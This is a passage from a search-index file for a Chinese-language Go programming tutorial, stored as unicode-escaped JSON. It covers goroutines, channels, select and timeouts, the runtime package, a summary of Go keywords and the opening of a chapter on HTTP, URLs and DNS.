<p>runtime.Gosched()\u8868\u793a\u8ba9CPU\u628a\u65f6\u95f4\u7247\u8ba9\u7ed9\u522b\u4eba,\u4e0b\u6b21\u67d0\u4e2a\u65f6\u5019\u7ee7\u7eed\u6062\u590d\u6267\u884c\u8be5goroutine\u3002</p> <p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5728Go 1.5\u5c06\u6807\u8bc6\u5e76\u53d1\u7cfb\u7edf\u7ebf\u7a0b\u4e2a\u6570\u7684runtime.GOMAXPROCS\u7684\u521d\u59cb\u503c\u75311\u6539\u4e3a\u4e86\u8fd0\u884c\u73af\u5883\u7684CPU\u6838\u6570\u3002</p> <p>\u4f46\u5728Go 1.5\u4ee5\u524d\u8c03\u5ea6\u5668\u4ec5\u4f7f\u7528\u5355\u7ebf\u7a0b\uff0c\u4e5f\u5c31\u662f\u8bf4\u53ea\u5b9e\u73b0\u4e86\u5e76\u53d1\u3002\u60f3\u8981\u53d1\u6325\u591a\u6838\u5904\u7406\u5668\u7684\u5e76\u884c\uff0c\u9700\u8981\u5728\u6211\u4eec\u7684\u7a0b\u5e8f\u4e2d\u663e\u5f0f\u8c03\u7528 runtime.GOMAXPROCS(n) \u544a\u8bc9\u8c03\u5ea6\u5668\u540c\u65f6\u4f7f\u7528\u591a\u4e2a\u7ebf\u7a0b\u3002GOMAXPROCS \u8bbe\u7f6e\u4e86\u540c\u65f6\u8fd0\u884c\u903b\u8f91\u4ee3\u7801\u7684\u7cfb\u7edf\u7ebf\u7a0b\u7684\u6700\u5927\u6570\u91cf\uff0c\u5e76\u8fd4\u56de\u4e4b\u524d\u7684\u8bbe\u7f6e\u3002\u5982\u679cn &lt; 1\uff0c\u4e0d\u4f1a\u6539\u53d8\u5f53\u524d\u8bbe\u7f6e\u3002</p>"},{"location":"02.7/#channels","title":"channels","text":"<p>goroutine\u8fd0\u884c\u5728\u76f8\u540c\u7684\u5730\u5740\u7a7a\u95f4\uff0c\u56e0\u6b64\u8bbf\u95ee\u5171\u4eab\u5185\u5b58\u5fc5\u987b\u505a\u597d\u540c\u6b65\u3002\u90a3\u4e48goroutine\u4e4b\u95f4\u5982\u4f55\u8fdb\u884c\u6570\u636e\u7684\u901a\u4fe1\u5462\uff0cGo\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5f88\u597d\u7684\u901a\u4fe1\u673a\u5236channel\u3002channel\u53ef\u4ee5\u4e0eUnix shell \u4e2d\u7684\u53cc\u5411\u7ba1\u9053\u505a\u7c7b\u6bd4\uff1a\u53ef\u4ee5\u901a\u8fc7\u5b83\u53d1\u9001\u6216\u8005\u63a5\u6536\u503c\u3002\u8fd9\u4e9b\u503c\u53ea\u80fd\u662f\u7279\u5b9a\u7684\u7c7b\u578b\uff1achannel\u7c7b\u578b\u3002\u5b9a\u4e49\u4e00\u4e2achannel\u65f6\uff0c\u4e5f\u9700\u8981\u5b9a\u4e49\u53d1\u9001\u5230channel\u7684\u503c\u7684\u7c7b\u578b\u3002\u6ce8\u610f\uff0c\u5fc5\u987b\u4f7f\u7528make \u521b\u5efachannel\uff1a <pre><code>ci := make(chan int)\ncs := make(chan string)\ncf := make(chan interface{})\n</code></pre> channel\u901a\u8fc7\u64cd\u4f5c\u7b26<code>&lt;-</code>\u6765\u63a5\u6536\u548c\u53d1\u9001\u6570\u636e <pre><code>ch &lt;- v    // \u53d1\u9001v\u5230channel ch.\nv := &lt;-ch  // \u4ecech\u4e2d\u63a5\u6536\u6570\u636e\uff0c\u5e76\u8d4b\u503c\u7ed9v\n</code></pre> \u6211\u4eec\u628a\u8fd9\u4e9b\u5e94\u7528\u5230\u6211\u4eec\u7684\u4f8b\u5b50\u4e2d\u6765\uff1a <pre><code>package main\n\nimport \"fmt\"\n\nfunc sum(a []int, c chan int) {\ntotal := 0\nfor _, v := range a {\ntotal += v\n}\nc &lt;- total  // send total to c\n}\n\nfunc main() {\na := []int{7, 2, 8, -9, 4, 0}\n\nc := make(chan int)\ngo sum(a[:len(a)/2], c)\ngo sum(a[len(a)/2:], c)\nx, y := &lt;-c, &lt;-c  // receive from c\n\nfmt.Println(x, y, x + y)\n}\n</code></pre> \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cchannel\u63a5\u6536\u548c\u53d1\u9001\u6570\u636e\u90fd\u662f\u963b\u585e\u7684\uff0c\u9664\u975e\u53e6\u4e00\u7aef\u5df2\u7ecf\u51c6\u5907\u597d\uff0c\u8fd9\u6837\u5c31\u4f7f\u5f97Goroutines\u540c\u6b65\u53d8\u7684\u66f4\u52a0\u7684\u7b80\u5355\uff0c\u800c\u4e0d\u9700\u8981\u663e\u5f0f\u7684lock\u3002\u6240\u8c13\u963b\u585e\uff0c\u4e5f\u5c31\u662f\u5982\u679c\u8bfb\u53d6\uff08value := &lt;-ch\uff09\u5b83\u5c06\u4f1a\u88ab\u963b\u585e\uff0c\u76f4\u5230\u6709\u6570\u636e\u63a5\u6536\u3002\u5176\u6b21\uff0c\u4efb\u4f55\u53d1\u9001\uff08ch&lt;-5\uff09\u5c06\u4f1a\u88ab\u963b\u585e\uff0c\u76f4\u5230\u6570\u636e\u88ab\u8bfb\u51fa\u3002\u65e0\u7f13\u51b2channel\u662f\u5728\u591a\u4e2agoroutine\u4e4b\u95f4\u540c\u6b65\u5f88\u68d2\u7684\u5de5\u5177\u3002</p>"},{"location":"02.7/#buffered-channels","title":"Buffered Channels","text":"<p>\u4e0a\u9762\u6211\u4eec\u4ecb\u7ecd\u4e86\u9ed8\u8ba4\u7684\u975e\u7f13\u5b58\u7c7b\u578b\u7684channel\uff0c\u4e0d\u8fc7Go\u4e5f\u5141\u8bb8\u6307\u5b9achannel\u7684\u7f13\u51b2\u5927\u5c0f\uff0c\u5f88\u7b80\u5355\uff0c\u5c31\u662fchannel\u53ef\u4ee5\u5b58\u50a8\u591a\u5c11\u5143\u7d20\u3002ch:= make(chan bool, 4)\uff0c\u521b\u5efa\u4e86\u53ef\u4ee5\u5b58\u50a84\u4e2a\u5143\u7d20\u7684bool \u578bchannel\u3002\u5728\u8fd9\u4e2achannel \u4e2d\uff0c\u524d4\u4e2a\u5143\u7d20\u53ef\u4ee5\u65e0\u963b\u585e\u7684\u5199\u5165\u3002\u5f53\u5199\u5165\u7b2c5\u4e2a\u5143\u7d20\u65f6\uff0c\u4ee3\u7801\u5c06\u4f1a\u963b\u585e\uff0c\u76f4\u5230\u5176\u4ed6goroutine\u4ecechannel \u4e2d\u8bfb\u53d6\u4e00\u4e9b\u5143\u7d20\uff0c\u817e\u51fa\u7a7a\u95f4\u3002 <pre><code>ch := make(chan type, value)\n</code></pre> \u5f53 value = 0 \u65f6\uff0cchannel \u662f\u65e0\u7f13\u51b2\u963b\u585e\u8bfb\u5199\u7684\uff0c\u5f53value &gt; 0 \u65f6\uff0cchannel \u6709\u7f13\u51b2\u3001\u662f\u975e\u963b\u585e\u7684\uff0c\u76f4\u5230\u5199\u6ee1 value \u4e2a\u5143\u7d20\u624d\u963b\u585e\u5199\u5165\u3002</p> <p>\u6211\u4eec\u770b\u4e00\u4e0b\u4e0b\u9762\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u4f60\u53ef\u4ee5\u5728\u81ea\u5df1\u672c\u673a\u6d4b\u8bd5\u4e00\u4e0b\uff0c\u4fee\u6539\u76f8\u5e94\u7684value\u503c <pre><code>package main\n\nimport \"fmt\"\n\nfunc main() {\nc := make(chan int, 2)//\u4fee\u65392\u4e3a1\u5c31\u62a5\u9519\uff0c\u4fee\u65392\u4e3a3\u53ef\u4ee5\u6b63\u5e38\u8fd0\u884c\nc &lt;- 1\nc &lt;- 2\nfmt.Println(&lt;-c)\nfmt.Println(&lt;-c)\n}\n//\u4fee\u6539\u4e3a1\u62a5\u5982\u4e0b\u7684\u9519\u8bef:\n//fatal error: all goroutines are asleep - deadlock!\n</code></pre></p>"},{"location":"02.7/#rangeclose","title":"Range\u548cClose","text":"<p>\u4e0a\u9762\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u9700\u8981\u8bfb\u53d6\u4e24\u6b21c\uff0c\u8fd9\u6837\u4e0d\u662f\u5f88\u65b9\u4fbf\uff0cGo\u8003\u8651\u5230\u4e86\u8fd9\u4e00\u70b9\uff0c\u6240\u4ee5\u4e5f\u53ef\u4ee5\u901a\u8fc7range\uff0c\u50cf\u64cd\u4f5cslice\u6216\u8005map\u4e00\u6837\u64cd\u4f5c\u7f13\u5b58\u7c7b\u578b\u7684channel\uff0c\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50 <pre><code>package main\n\nimport (\n\"fmt\"\n)\n\nfunc fibonacci(n int, c chan int) {\nx, y := 1, 1\nfor i := 0; i &lt; n; i++ {\nc &lt;- x\nx, y = y, x + y\n}\nclose(c)\n}\n\nfunc main() {\nc := make(chan int, 10)\ngo fibonacci(cap(c), c)\nfor i := range c {\nfmt.Println(i)\n}\n}\n</code></pre> <code>for i := range c</code>\u80fd\u591f\u4e0d\u65ad\u7684\u8bfb\u53d6channel\u91cc\u9762\u7684\u6570\u636e\uff0c\u76f4\u5230\u8be5channel\u88ab\u663e\u5f0f\u7684\u5173\u95ed\u3002\u4e0a\u9762\u4ee3\u7801\u6211\u4eec\u770b\u5230\u53ef\u4ee5\u663e\u5f0f\u7684\u5173\u95edchannel\uff0c\u751f\u4ea7\u8005\u901a\u8fc7\u5185\u7f6e\u51fd\u6570<code>close</code>\u5173\u95edchannel\u3002\u5173\u95edchannel\u4e4b\u540e\u5c31\u65e0\u6cd5\u518d\u53d1\u9001\u4efb\u4f55\u6570\u636e\u4e86\uff0c\u5728\u6d88\u8d39\u65b9\u53ef\u4ee5\u901a\u8fc7\u8bed\u6cd5<code>v, ok := &lt;-ch</code>\u6d4b\u8bd5channel\u662f\u5426\u88ab\u5173\u95ed\u3002\u5982\u679cok\u8fd4\u56defalse\uff0c\u90a3\u4e48\u8bf4\u660echannel\u5df2\u7ecf\u6ca1\u6709\u4efb\u4f55\u6570\u636e\u5e76\u4e14\u5df2\u7ecf\u88ab\u5173\u95ed\u3002</p> <p>\u8bb0\u4f4f\u5e94\u8be5\u5728\u751f\u4ea7\u8005\u7684\u5730\u65b9\u5173\u95edchannel\uff0c\u800c\u4e0d\u662f\u6d88\u8d39\u7684\u5730\u65b9\u53bb\u5173\u95ed\u5b83\uff0c\u8fd9\u6837\u5bb9\u6613\u5f15\u8d77panic</p> <p>\u53e6\u5916\u8bb0\u4f4f\u4e00\u70b9\u7684\u5c31\u662fchannel\u4e0d\u50cf\u6587\u4ef6\u4e4b\u7c7b\u7684\uff0c\u4e0d\u9700\u8981\u7ecf\u5e38\u53bb\u5173\u95ed\uff0c\u53ea\u6709\u5f53\u4f60\u786e\u5b9e\u6ca1\u6709\u4efb\u4f55\u53d1\u9001\u6570\u636e\u4e86\uff0c\u6216\u8005\u4f60\u60f3\u663e\u5f0f\u7684\u7ed3\u675frange\u5faa\u73af\u4e4b\u7c7b\u7684</p>"},{"location":"02.7/#select","title":"Select","text":"<p>\u6211\u4eec\u4e0a\u9762\u4ecb\u7ecd\u7684\u90fd\u662f\u53ea\u6709\u4e00\u4e2achannel\u7684\u60c5\u51b5\uff0c\u90a3\u4e48\u5982\u679c\u5b58\u5728\u591a\u4e2achannel\u7684\u65f6\u5019\uff0c\u6211\u4eec\u8be5\u5982\u4f55\u64cd\u4f5c\u5462\uff0cGo\u91cc\u9762\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5173\u952e\u5b57<code>select</code>\uff0c\u901a\u8fc7<code>select</code>\u53ef\u4ee5\u76d1\u542cchannel\u4e0a\u7684\u6570\u636e\u6d41\u52a8\u3002</p> <p><code>select</code>\u9ed8\u8ba4\u662f\u963b\u585e\u7684\uff0c\u53ea\u6709\u5f53\u76d1\u542c\u7684channel\u4e2d\u6709\u53d1\u9001\u6216\u63a5\u6536\u53ef\u4ee5\u8fdb\u884c\u65f6\u624d\u4f1a\u8fd0\u884c\uff0c\u5f53\u591a\u4e2achannel\u90fd\u51c6\u5907\u597d\u7684\u65f6\u5019\uff0cselect\u662f\u968f\u673a\u7684\u9009\u62e9\u4e00\u4e2a\u6267\u884c\u7684\u3002 <pre><code>package main\n\nimport \"fmt\"\n\nfunc fibonacci(c, quit chan int) {\nx, y := 1, 1\nfor {\nselect {\ncase c &lt;- x:\nx, y = y, x + y\ncase &lt;-quit:\nfmt.Println(\"quit\")\nreturn\n}\n}\n}\n\nfunc main() {\nc := make(chan int)\nquit := make(chan int)\ngo func() {\nfor i := 0; i &lt; 10; i++ {\nfmt.Println(&lt;-c)\n}\nquit &lt;- 0\n}()\nfibonacci(c, quit)\n}\n</code></pre> \u5728<code>select</code>\u91cc\u9762\u8fd8\u6709default\u8bed\u6cd5\uff0c<code>select</code>\u5176\u5b9e\u5c31\u662f\u7c7b\u4f3cswitch\u7684\u529f\u80fd\uff0cdefault\u5c31\u662f\u5f53\u76d1\u542c\u7684channel\u90fd\u6ca1\u6709\u51c6\u5907\u597d\u7684\u65f6\u5019\uff0c\u9ed8\u8ba4\u6267\u884c\u7684\uff08select\u4e0d\u518d\u963b\u585e\u7b49\u5f85channel\uff09\u3002 <pre><code>select {\ncase i := &lt;-c:\n// use i\ndefault:\n// \u5f53c\u963b\u585e\u7684\u65f6\u5019\u6267\u884c\u8fd9\u91cc\n}\n</code></pre></p>"},{"location":"02.7/#_1","title":"\u8d85\u65f6","text":"<p>\u6709\u65f6\u5019\u4f1a\u51fa\u73b0goroutine\u963b\u585e\u7684\u60c5\u51b5\uff0c\u90a3\u4e48\u6211\u4eec\u5982\u4f55\u907f\u514d\u6574\u4e2a\u7a0b\u5e8f\u8fdb\u5165\u963b\u585e\u7684\u60c5\u51b5\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u5229\u7528select\u6765\u8bbe\u7f6e\u8d85\u65f6\uff0c\u901a\u8fc7\u5982\u4e0b\u7684\u65b9\u5f0f\u5b9e\u73b0\uff1a <pre><code>func main() {\nc := make(chan int)\no := make(chan bool)\ngo func() {\nfor {\nselect {\ncase v := &lt;- c:\nprintln(v)\ncase &lt;- time.After(5 * time.Second):\nprintln(\"timeout\")\no &lt;- true\nbreak\n}\n}\n}()\n&lt;- o\n}\n</code></pre></p>"},{"location":"02.7/#runtime-goroutine","title":"runtime goroutine","text":"<p>runtime\u5305\u4e2d\u6709\u51e0\u4e2a\u5904\u7406goroutine\u7684\u51fd\u6570\uff1a</p> <ul> <li> <p>Goexit</p> <p>\u9000\u51fa\u5f53\u524d\u6267\u884c\u7684goroutine\uff0c\u4f46\u662fdefer\u51fd\u6570\u8fd8\u4f1a\u7ee7\u7eed\u8c03\u7528</p> </li> <li> <p>Gosched</p> <p>\u8ba9\u51fa\u5f53\u524dgoroutine\u7684\u6267\u884c\u6743\u9650\uff0c\u8c03\u5ea6\u5668\u5b89\u6392\u5176\u4ed6\u7b49\u5f85\u7684\u4efb\u52a1\u8fd0\u884c\uff0c\u5e76\u5728\u4e0b\u6b21\u67d0\u4e2a\u65f6\u5019\u4ece\u8be5\u4f4d\u7f6e\u6062\u590d\u6267\u884c\u3002</p> </li> <li> <p>NumCPU</p> <p>\u8fd4\u56de CPU \u6838\u6570\u91cf</p> </li> <li> <p>NumGoroutine</p> <p>\u8fd4\u56de\u6b63\u5728\u6267\u884c\u548c\u6392\u961f\u7684\u4efb\u52a1\u603b\u6570</p> </li> <li> <p>GOMAXPROCS</p> <p>\u7528\u6765\u8bbe\u7f6e\u53ef\u4ee5\u5e76\u884c\u8ba1\u7b97\u7684CPU\u6838\u6570\u7684\u6700\u5927\u503c\uff0c\u5e76\u8fd4\u56de\u4e4b\u524d\u7684\u503c\u3002</p> </li> </ul>"},{"location":"02.7/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u7ae0: interface</li> <li>\u4e0b\u4e00\u8282: \u603b\u7ed3</li> </ul>"},{"location":"02.8/","title":"2.8 \u603b\u7ed3","text":"<p>\u8fd9\u4e00\u7ae0\u6211\u4eec\u4e3b\u8981\u4ecb\u7ecd\u4e86Go\u8bed\u8a00\u7684\u4e00\u4e9b\u8bed\u6cd5\uff0c\u901a\u8fc7\u8bed\u6cd5\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0Go\u662f\u591a\u4e48\u7684\u7b80\u5355\uff0c\u53ea\u6709\u4e8c\u5341\u4e94\u4e2a\u5173\u952e\u5b57\u3002\u8ba9\u6211\u4eec\u518d\u6765\u56de\u987e\u4e00\u4e0b\u8fd9\u4e9b\u5173\u952e\u5b57\u90fd\u662f\u7528\u6765\u5e72\u4ec0\u4e48\u7684\u3002 <pre><code>break    default      func    interface    select\ncase     defer        go      map          struct\nchan     else         goto    package      switch\nconst    fallthrough  if      range        type\ncontinue for          import  return       var\n</code></pre> - var\u548cconst\u53c2\u80032.2Go\u8bed\u8a00\u57fa\u7840\u91cc\u9762\u7684\u53d8\u91cf\u548c\u5e38\u91cf\u7533\u660e - package\u548cimport\u5df2\u7ecf\u6709\u8fc7\u77ed\u6682\u7684\u63a5\u89e6 - func \u7528\u4e8e\u5b9a\u4e49\u51fd\u6570\u548c\u65b9\u6cd5 - return \u7528\u4e8e\u4ece\u51fd\u6570\u8fd4\u56de - defer \u7528\u4e8e\u7c7b\u4f3c\u6790\u6784\u51fd\u6570 - go \u7528\u4e8e\u5e76\u53d1 - select \u7528\u4e8e\u9009\u62e9\u4e0d\u540c\u7c7b\u578b\u7684\u901a\u8baf - interface \u7528\u4e8e\u5b9a\u4e49\u63a5\u53e3\uff0c\u53c2\u80032.6\u5c0f\u8282 - struct \u7528\u4e8e\u5b9a\u4e49\u62bd\u8c61\u6570\u636e\u7c7b\u578b\uff0c\u53c2\u80032.5\u5c0f\u8282 - break\u3001case\u3001continue\u3001for\u3001fallthrough\u3001else\u3001if\u3001switch\u3001goto\u3001default\u8fd9\u4e9b\u53c2\u80032.3\u6d41\u7a0b\u4ecb\u7ecd\u91cc\u9762 - chan\u7528\u4e8echannel\u901a\u8baf - type\u7528\u4e8e\u58f0\u660e\u81ea\u5b9a\u4e49\u7c7b\u578b - map\u7528\u4e8e\u58f0\u660emap\u7c7b\u578b\u6570\u636e - range\u7528\u4e8e\u8bfb\u53d6slice\u3001map\u3001channel\u6570\u636e</p> <p>\u4e0a\u9762\u8fd9\u4e8c\u5341\u4e94\u4e2a\u5173\u952e\u5b57\u8bb0\u4f4f\u4e86\uff0c\u90a3\u4e48Go\u4f60\u4e5f\u5df2\u7ecf\u5dee\u4e0d\u591a\u5b66\u4f1a\u4e86\u3002</p>"},{"location":"02.8/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u5e76\u53d1</li> <li>\u4e0b\u4e00\u7ae0: Web\u57fa\u7840</li> </ul>"},{"location":"03.0/","title":"3 Web\u57fa\u7840","text":"<p>\u5b66\u4e60\u57fa\u4e8eWeb\u7684\u7f16\u7a0b\u53ef\u80fd\u6b63\u662f\u4f60\u8bfb\u672c\u4e66\u7684\u539f\u56e0\u3002\u4e8b\u5b9e\u4e0a\uff0c\u5982\u4f55\u901a\u8fc7Go\u6765\u7f16\u5199Web\u5e94\u7528\u4e5f\u662f\u6211\u7f16\u5199\u8fd9\u672c\u4e66\u7684\u521d\u8877\u3002\u524d\u9762\u5df2\u7ecf\u4ecb\u7ecd\u8fc7\uff0cGo\u76ee\u524d\u5df2\u7ecf\u62e5\u6709\u4e86\u6210\u719f\u7684HTTP\u5904\u7406\u5305\uff0c\u8fd9\u4f7f\u5f97\u7f16\u5199\u80fd\u505a\u4efb\u4f55\u4e8b\u60c5\u7684\u52a8\u6001Web\u7a0b\u5e8f\u6613\u5982\u53cd\u638c\u3002\u5728\u63a5\u4e0b\u6765\u7684\u5404\u7ae0\u4e2d\u5c06\u8981\u4ecb\u7ecd\u7684\u5185\u5bb9\uff0c\u90fd\u662f\u5c5e\u4e8eWeb\u7f16\u7a0b\u7684\u8303\u7574\u3002\u672c\u7ae0\u5219\u96c6\u4e2d\u8ba8\u8bba\u4e00\u4e9b\u4e0eWeb\u76f8\u5173\u7684\u6982\u5ff5\u548cGo\u5982\u4f55\u8fd0\u884cWeb\u7a0b\u5e8f\u7684\u8bdd\u9898\u3002</p>"},{"location":"03.0/#_1","title":"\u76ee\u5f55","text":""},{"location":"03.0/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u7ae0: \u7b2c\u4e8c\u7ae0\u603b\u7ed3</li> <li>\u4e0b\u4e00\u8282: Web\u5de5\u4f5c\u65b9\u5f0f</li> </ul>"},{"location":"03.1/","title":"3.1 Web\u5de5\u4f5c\u65b9\u5f0f","text":"<p>\u6211\u4eec\u5e73\u65f6\u6d4f\u89c8\u7f51\u9875\u7684\u65f6\u5019,\u4f1a\u6253\u5f00\u6d4f\u89c8\u5668\uff0c\u8f93\u5165\u7f51\u5740\u540e\u6309\u4e0b\u56de\u8f66\u952e\uff0c\u7136\u540e\u5c31\u4f1a\u663e\u793a\u51fa\u4f60\u60f3\u8981\u6d4f\u89c8\u7684\u5185\u5bb9\u3002\u5728\u8fd9\u4e2a\u770b\u4f3c\u7b80\u5355\u7684\u7528\u6237\u884c\u4e3a\u80cc\u540e\uff0c\u5230\u5e95\u9690\u85cf\u4e86\u4e9b\u4ec0\u4e48\u5462\uff1f</p> <p>\u5bf9\u4e8e\u666e\u901a\u7684\u4e0a\u7f51\u8fc7\u7a0b\uff0c\u7cfb\u7edf\u5176\u5b9e\u662f\u8fd9\u6837\u505a\u7684\uff1a\u6d4f\u89c8\u5668\u672c\u8eab\u662f\u4e00\u4e2a\u5ba2\u6237\u7aef\uff0c\u5f53\u4f60\u8f93\u5165URL\u7684\u65f6\u5019\uff0c\u9996\u5148\u6d4f\u89c8\u5668\u4f1a\u53bb\u8bf7\u6c42DNS\u670d\u52a1\u5668\uff0c\u901a\u8fc7DNS\u83b7\u53d6\u76f8\u5e94\u7684\u57df\u540d\u5bf9\u5e94\u7684IP\uff0c\u7136\u540e\u901a\u8fc7IP\u5730\u5740\u627e\u5230IP\u5bf9\u5e94\u7684\u670d\u52a1\u5668\u540e\uff0c\u8981\u6c42\u5efa\u7acbTCP\u8fde\u63a5\uff0c\u7b49\u6d4f\u89c8\u5668\u53d1\u9001\u5b8cHTTP Request\uff08\u8bf7\u6c42\uff09\u5305\u540e\uff0c\u670d\u52a1\u5668\u63a5\u6536\u5230\u8bf7\u6c42\u5305\u4e4b\u540e\u624d\u5f00\u59cb\u5904\u7406\u8bf7\u6c42\u5305\uff0c\u670d\u52a1\u5668\u8c03\u7528\u81ea\u8eab\u670d\u52a1\uff0c\u8fd4\u56deHTTP Response\uff08\u54cd\u5e94\uff09\u5305\uff1b\u5ba2\u6237\u7aef\u6536\u5230\u6765\u81ea\u670d\u52a1\u5668\u7684\u54cd\u5e94\u540e\u5f00\u59cb\u6e32\u67d3\u8fd9\u4e2aResponse\u5305\u91cc\u7684\u4e3b\u4f53\uff08body\uff09\uff0c\u7b49\u6536\u5230\u5168\u90e8\u7684\u5185\u5bb9\u968f\u540e\u65ad\u5f00\u4e0e\u8be5\u670d\u52a1\u5668\u4e4b\u95f4\u7684TCP\u8fde\u63a5\u3002</p> <p></p> <p>\u56fe3.1 \u7528\u6237\u8bbf\u95ee\u4e00\u4e2aWeb\u7ad9\u70b9\u7684\u8fc7\u7a0b</p> <p>\u4e00\u4e2aWeb\u670d\u52a1\u5668\u4e5f\u88ab\u79f0\u4e3aHTTP\u670d\u52a1\u5668\uff0c\u5b83\u901a\u8fc7HTTP\u534f\u8bae\u4e0e\u5ba2\u6237\u7aef\u901a\u4fe1\u3002\u8fd9\u4e2a\u5ba2\u6237\u7aef\u901a\u5e38\u6307\u7684\u662fWeb\u6d4f\u89c8\u5668(\u5176\u5b9e\u624b\u673a\u7aef\u5ba2\u6237\u7aef\u5185\u90e8\u4e5f\u662f\u6d4f\u89c8\u5668\u5b9e\u73b0\u7684)\u3002</p> <p>Web\u670d\u52a1\u5668\u7684\u5de5\u4f5c\u539f\u7406\u53ef\u4ee5\u7b80\u5355\u5730\u5f52\u7eb3\u4e3a\uff1a</p> <ul> <li>\u5ba2\u6237\u673a\u901a\u8fc7TCP/IP\u534f\u8bae\u5efa\u7acb\u5230\u670d\u52a1\u5668\u7684TCP\u8fde\u63a5</li> <li>\u5ba2\u6237\u7aef\u5411\u670d\u52a1\u5668\u53d1\u9001HTTP\u534f\u8bae\u8bf7\u6c42\u5305\uff0c\u8bf7\u6c42\u670d\u52a1\u5668\u91cc\u7684\u8d44\u6e90\u6587\u6863</li> <li>\u670d\u52a1\u5668\u5411\u5ba2\u6237\u673a\u53d1\u9001HTTP\u534f\u8bae\u5e94\u7b54\u5305\uff0c\u5982\u679c\u8bf7\u6c42\u7684\u8d44\u6e90\u5305\u542b\u6709\u52a8\u6001\u8bed\u8a00\u7684\u5185\u5bb9\uff0c\u90a3\u4e48\u670d\u52a1\u5668\u4f1a\u8c03\u7528\u52a8\u6001\u8bed\u8a00\u7684\u89e3\u91ca\u5f15\u64ce\u8d1f\u8d23\u5904\u7406\u201c\u52a8\u6001\u5185\u5bb9\u201d\uff0c\u5e76\u5c06\u5904\u7406\u5f97\u5230\u7684\u6570\u636e\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef</li> <li>\u5ba2\u6237\u673a\u4e0e\u670d\u52a1\u5668\u65ad\u5f00\u3002\u7531\u5ba2\u6237\u7aef\u89e3\u91caHTML\u6587\u6863\uff0c\u5728\u5ba2\u6237\u7aef\u5c4f\u5e55\u4e0a\u6e32\u67d3\u56fe\u5f62\u7ed3\u679c</li> </ul> <p>\u4e00\u4e2a\u7b80\u5355\u7684HTTP\u4e8b\u52a1\u5c31\u662f\u8fd9\u6837\u5b9e\u73b0\u7684\uff0c\u770b\u8d77\u6765\u5f88\u590d\u6742\uff0c\u539f\u7406\u5176\u5b9e\u662f\u633a\u7b80\u5355\u7684\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\u5ba2\u6237\u673a\u4e0e\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u901a\u4fe1\u662f\u975e\u6301\u4e45\u8fde\u63a5\u7684\uff0c\u4e5f\u5c31\u662f\u5f53\u670d\u52a1\u5668\u53d1\u9001\u4e86\u5e94\u7b54\u540e\u5c31\u4e0e\u5ba2\u6237\u673a\u65ad\u5f00\u8fde\u63a5\uff0c\u7b49\u5f85\u4e0b\u4e00\u6b21\u8bf7\u6c42\u3002</p>"},{"location":"03.1/#urldns","title":"URL\u548cDNS\u89e3\u6790","text":"<p>\u6211\u4eec\u6d4f\u89c8\u7f51\u9875\u90fd\u662f\u901a\u8fc7URL\u8bbf\u95ee\u7684\uff0c\u90a3\u4e48URL\u5230\u5e95\u662f\u600e\u4e48\u6837\u7684\u5462\uff1f</p> <p>URL(Uniform Resource Locator)\u662f\u201c\u7edf\u4e00\u8d44\u6e90\u5b9a\u4f4d\u7b26\u201d\u7684\u82f1\u6587\u7f29\u5199\uff0c\u7528\u4e8e\u63cf\u8ff0\u4e00\u4e2a\u7f51\u7edc\u4e0a\u7684\u8d44\u6e90, \u57fa\u672c\u683c\u5f0f\u5982\u4e0b</p> <pre><code>scheme://host[:port#]/path/.../[?query-string][#anchor]\nscheme         \u6307\u5b9a\u5e95\u5c42\u4f7f\u7528\u7684\u534f\u8bae(\u4f8b\u5982\uff1ahttp, https, ftp)\nhost           HTTP\u670d\u52a1\u5668\u7684IP\u5730\u5740\u6216\u8005\u57df\u540d\nport#          HTTP\u670d\u52a1\u5668\u7684\u9ed8\u8ba4\u7aef\u53e3\u662f80\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u7aef\u53e3\u53f7\u53ef\u4ee5\u7701\u7565\u3002\u5982\u679c\u4f7f\u7528\u4e86\u522b\u7684\u7aef\u53e3\uff0c\u5fc5\u987b\u6307\u660e\uff0c\u4f8b\u5982 http://www.cnblogs.com:8080/\npath           \u8bbf\u95ee\u8d44\u6e90\u7684\u8def\u5f84\nquery-string   \u53d1\u9001\u7ed9http\u670d\u52a1\u5668\u7684\u6570\u636e\nanchor         \u951a\n</code></pre> <p>DNS(Domain Name System)\u662f\u201c\u57df\u540d\u7cfb\u7edf\u201d\u7684\u82f1\u6587\u7f29\u5199\uff0c\u662f\u4e00\u79cd\u7ec4\u7ec7\u6210\u57df\u5c42\u6b21\u7ed3\u6784\u7684\u8ba1\u7b97\u673a\u548c\u7f51\u7edc\u670d\u52a1\u547d\u540d\u7cfb\u7edf\uff0c\u5b83\u7528\u4e8eTCP/IP\u7f51\u7edc\uff0c\u5b83\u4ece\u4e8b\u5c06\u4e3b\u673a\u540d\u6216\u57df\u540d\u8f6c\u6362\u4e3a\u5b9e\u9645IP\u5730\u5740\u7684\u5de5\u4f5c\u3002DNS\u5c31\u662f\u8fd9\u6837\u7684\u4e00\u4f4d\u201c\u7ffb\u8bd1\u5b98\u201d\uff0c\u5b83\u7684\u57fa\u672c\u5de5\u4f5c\u539f\u7406\u53ef\u7528\u4e0b\u56fe\u6765\u8868\u793a\u3002</p> <p></p> <p>\u56fe3.2 DNS\u5de5\u4f5c\u539f\u7406</p> <p>\u66f4\u8be6\u7ec6\u7684DNS\u89e3\u6790\u7684\u8fc7\u7a0b\u5982\u4e0b\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u6709\u52a9\u4e8e\u6211\u4eec\u7406\u89e3DNS\u7684\u5de5\u4f5c\u6a21\u5f0f</p> <ol> <li> 